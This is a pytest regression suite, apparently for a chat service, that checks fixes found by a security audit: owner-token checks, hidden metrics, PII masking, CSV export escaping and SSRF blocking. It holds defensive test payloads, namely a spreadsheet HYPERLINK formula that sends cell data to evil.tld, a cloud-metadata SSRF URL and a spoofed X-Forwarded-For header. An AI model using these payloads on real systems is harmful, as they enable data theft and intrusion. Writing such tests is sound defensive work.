"""Проверки на дыры, найденные аудитом безопасности.

Каждый тест воспроизводит конкретную атаку из отчёта и требует, чтобы она
больше не проходила. Это регресс-набор: правки такого рода легко откатить
случайным рефакторингом, и тогда нужен красный тест, а не память.
"""

import pytest

from app.security import CHAT_WS_PROTOCOL, session_owner_token


def _session(client) -> str:
    return client.post("/api/chat/sessions").json()["session_id"]


# --- владение диалогом ---


def test_write_requires_owner_token(client):
    """Знание id больше не даёт права писать: id уезжает в выгрузку диалогов и
    в /dbadmin, а запись без доказательства владения — это подмена личности
    заявителя в живом разговоре с оператором."""
    sid = _session(client)
    # posix-клиент без токена (обходим авто-подстановку тестового клиента)
    raw = client.post(
        f"/api/chat/sessions/{sid}/messages",
        json={"text": "Как зарегистрироваться?"},
        headers={"X-Session-Owner": "0" * 32},
    )
    assert raw.status_code == 403

    ok = client.post(f"/api/chat/sessions/{sid}/messages", json={"text": "Как зарегистрироваться?"})
    assert ok.status_code == 200


def test_rating_and_feedback_require_owner(client):
    sid = _session(client)
    client.post(f"/api/chat/sessions/{sid}/messages", json={"text": "Что такое СТЕ?"})
    messages = client.get(f"/api/chat/sessions/{sid}/messages").json()
    answer = [m for m in messages if m["role"] == "assistant"][-1]

    stranger = {"X-Session-Owner": "f" * 32}
    assert (
        client.post(
            f"/api/chat/sessions/{sid}/messages/{answer['id']}/rating", json={"value": -1}, headers=stranger
        ).status_code
        == 403
    )
    assert (
        client.post(
            f"/api/chat/sessions/{sid}/feedback", json={"rating": 5, "comment": ""}, headers=stranger
        ).status_code
        == 403
    )


def test_websocket_requires_owner(client):
    """Сокет двунаправленный: без проверки посторонний читал диалог в реальном
    времени и писал реплики от имени заявителя."""
    from starlette.websockets import WebSocketDisconnect

    sid = _session(client)
    with pytest.raises(WebSocketDisconnect) as exc:
        with client.websocket_connect(
            f"/ws/chat/{sid}", subprotocols=[CHAT_WS_PROTOCOL, f"owner.{'0' * 32}"]
        ):
            pass
    assert exc.value.code == 4403

    # с настоящим токеном подключение проходит, и сервер подтверждает протокол
    owner = f"owner.{session_owner_token(sid)}"
    with client.websocket_connect(f"/ws/chat/{sid}", subprotocols=[CHAT_WS_PROTOCOL, owner]) as ws:
        assert ws.accepted_subprotocol == CHAT_WS_PROTOCOL
        ws.send_json({"type": "typing", "text": "приз"})


def test_websocket_owner_is_not_taken_from_the_address(client):
    """Токен в адресе оседал в логах прокси и в истории браузера: адрес больше
    не доказывает владение — только заголовок подпротокола."""
    from starlette.websockets import WebSocketDisconnect

    sid = _session(client)
    with pytest.raises(WebSocketDisconnect) as exc:
        with client.websocket_connect(
            f"/ws/chat/{sid}?owner={session_owner_token(sid)}", subprotocols=[CHAT_WS_PROTOCOL]
        ):
            pass
    assert exc.value.code == 4403


# --- служебные ручки наружу ---


def test_metrics_open_in_lite_without_token(client):
    assert client.get("/metrics").status_code == 200


def test_metrics_require_token_when_configured(client, monkeypatch):
    from app.config import get_settings

    monkeypatch.setattr(get_settings(), "metrics_token", "scrape-secret")

    assert client.get("/metrics").status_code == 401
    ok = client.get("/metrics", headers={"Authorization": "Bearer scrape-secret"})
    assert ok.status_code == 200
    assert "app_requests_total" in ok.text


def test_metrics_closed_in_full_mode_without_token(client, monkeypatch):
    """Счётчики по путям и кодам — карта API для постороннего: без токена в
    боевом режиме ручки нет вовсе."""
    from app.config import get_settings

    monkeypatch.setattr(get_settings(), "app_mode", "full")

    assert client.get("/metrics").status_code == 404


def test_api_docs_off_in_full_mode_unless_enabled():
    from app.config import Settings

    assert Settings(app_mode="lite").docs_enabled
    assert not Settings(app_mode="full").docs_enabled
    assert Settings(app_mode="full", api_docs=True).docs_enabled


def test_demo_credentials_are_announced_only_in_lite(client, monkeypatch):
    """Страница входа показывала демо-пароли и в боевом режиме, где пароли
    случайные: подсказка вела в тупик и раскрывала логины."""
    from app.config import get_settings

    assert client.get("/api/meta").json()["demo"] is True
    monkeypatch.setattr(get_settings(), "app_mode", "full")
    assert client.get("/api/meta").json()["demo"] is False


def test_demo_credentials_only_while_seeder_uses_demo_passwords():
    """Подсказка верна, пока пароли демо — заданы явно или подставлены сидером.
    Свой пароль в lite делает её ложной, а в full демо-паролей нет вовсе."""
    from app.config import Settings

    def demo(**overrides: str) -> bool:
        values = {"app_mode": "lite", "admin_password": "", "operator_password": ""} | overrides
        return Settings(**values).demo_credentials

    assert demo()
    assert demo(admin_password="admin12345", operator_password="operator12345")
    assert not demo(admin_password="свой-пароль")
    assert not demo(operator_password="свой-пароль")
    assert not demo(app_mode="full")


def test_client_address_is_the_peer_uvicorn_resolved():
    """Левый адрес в X-Forwarded-For пишет сам клиент, nginx лишь дописывает
    настоящий справа: брать его значило дать клиенту выбирать себе ведро лимита.
    Цепочку за доверенными прокси разбирает uvicorn (FORWARDED_ALLOW_IPS)."""
    from starlette.requests import Request

    from app.security import client_ip

    scope = {
        "type": "http",
        "method": "POST",
        "path": "/api/auth/login",
        "headers": [(b"x-forwarded-for", b"6.6.6.6")],
        "client": ("203.0.113.7", 5555),
    }
    assert client_ip(Request(scope)) == "203.0.113.7"


# --- утечка чужих сообщений через подсказки ---


def test_suggestions_do_not_leak_single_messages(client):
    """Одиночная реплика не должна попадать в подсказки: там она видна любому
    анониму вместе с телефоном, почтой и ИНН."""
    sid = _session(client)
    secret = "Не приходит код на телефон +7 916 555-31-77, почта ivan.petrov@example.com"
    client.post(f"/api/chat/sessions/{sid}/messages", json={"text": secret})

    for probe in ("телефон", "почта", "ivan", "916"):
        found = client.get("/api/chat/suggest", params={"q": probe}).json()
        assert all("555-31-77" not in s for s in found), probe
        assert all("ivan.petrov" not in s for s in found), probe

    # и в чипсах нового диалога тоже
    chips = client.post("/api/chat/sessions").json()["chips"]
    assert all("555-31-77" not in c for c in chips)


def test_tracked_queries_are_masked(client):
    """Даже став популярным, вопрос уходит в подсказки без персональных данных."""
    text = "Как продлить контракт, мой ИНН 7701234567 и почта petrov@example.com"
    for _ in range(4):
        sid = _session(client)
        client.post(f"/api/chat/sessions/{sid}/messages", json={"text": text})

    found = client.get("/api/chat/suggest", params={"q": "продлить"}).json()
    leaked = [s for s in found if "petrov@example.com" in s or "7701234567" in s]
    assert not leaked, leaked


# --- выгрузки ---


def test_csv_formula_is_defused(client, admin_headers):
    """Формула из чужого сообщения не должна исполняться у сотрудника в Excel."""
    sid = _session(client)
    client.post(
        f"/api/chat/sessions/{sid}/messages",
        json={"text": '=HYPERLINK("http://evil.tld/?d="&A1,"Отчет") где мои оферты'},
    )

    csv_text = client.get("/api/admin/export/dialogs.csv", headers=admin_headers).text
    assert "=HYPERLINK" in csv_text, "текст должен сохраниться"
    assert "'=HYPERLINK" in csv_text, "но с апострофом — как текст, а не формула"
    for line in csv_text.splitlines():
        for cell in line.split(";"):
            assert not cell.startswith("="), cell[:60]


# --- секреты MCP ---


def test_mcp_headers_never_returned(client, admin_headers, operator_headers):
    """Значения заголовков — это боевые ключи внешних систем. Раньше их целиком
    получал даже оператор."""
    client.put(
        "/api/admin/settings", headers=admin_headers, json={"updates": {"security.allow_internal_urls": True}}
    )
    try:
        client.post(
            "/api/admin/mcp",
            headers=admin_headers,
            json={
                "name": "secret-mcp",
                "url": "http://127.0.0.1:59998/mcp",
                "headers": {"Authorization": "Bearer SUPER-SECRET-KEY"},
            },
        )
        for who in (admin_headers, operator_headers):
            listing = client.get("/api/admin/mcp", headers=who).json()
            server = next(s for s in listing if s["name"] == "secret-mcp")
            assert server["headers"] == {"Authorization": "***"}
    finally:
        client.put(
            "/api/admin/settings",
            headers=admin_headers,
            json={"updates": {"security.allow_internal_urls": False}},
        )


# --- SSRF через настройки ---


def test_llm_base_url_cannot_point_inside(client, admin_headers):
    """Подменённый base_url уводит наружу API-ключ, который система специально
    маскирует в выдаче."""
    resp = client.put(
        "/api/admin/settings",
        headers=admin_headers,
        json={"updates": {"llm.base_url": "http://169.254.169.254/v1"}},
    )
    assert resp.status_code == 422
    assert "внутренн" in resp.json()["detail"]


# --- голосовой ввод ---


def test_voice_has_rate_limit(client, admin_headers):
    """Распознавание дорогое: без лимита один клиент занимал STT бесконечно."""
    client.put(
        "/api/admin/settings", headers=admin_headers, json={"updates": {"rate_limit.chat_per_minute": 1}}
    )
    try:
        codes = [
            client.post(
                "/api/voice/transcribe", files={"file": ("a.webm", b"x" * 100, "audio/webm")}
            ).status_code
            for _ in range(4)
        ]
        assert 429 in codes, codes
    finally:
        client.put(
            "/api/admin/settings", headers=admin_headers, json={"updates": {"rate_limit.chat_per_minute": 20}}
        )


def test_reading_a_dialog_requires_owner_proof(client):
    """Знания id мало: по нему видна вся переписка с оператором и вложения.

    Идентификатор уезжает в выгрузку диалогов и в /dbadmin, поэтому чтение
    требует того же доказательства владения, что и запись.
    """
    created = client.post("/api/chat/sessions").json()
    session_id = created["session_id"]

    # Клиент из conftest подставляет заголовок владельца сам — снимаем его.
    assert client.get(f"/api/chat/sessions/{session_id}", headers={"X-Session-Owner": ""}).status_code == 403
    assert (
        client.get(
            f"/api/chat/sessions/{session_id}/messages", headers={"X-Session-Owner": "0" * 32}
        ).status_code
        == 403
    )

    # Владелец читает как раньше.
    owner = {"X-Session-Owner": created["owner"]}
    assert client.get(f"/api/chat/sessions/{session_id}", headers=owner).status_code == 200
    assert client.get(f"/api/chat/sessions/{session_id}/messages", headers=owner).status_code == 200


def test_owner_token_is_not_accepted_from_query_on_rest(client):
    """Query-параметр оседает в логах прокси — для REST он больше не принимается."""
    created = client.post("/api/chat/sessions").json()
    session_id, owner = created["session_id"], created["owner"]
    resp = client.get(f"/api/chat/sessions/{session_id}?owner={owner}", headers={"X-Session-Owner": ""})
    assert resp.status_code == 403
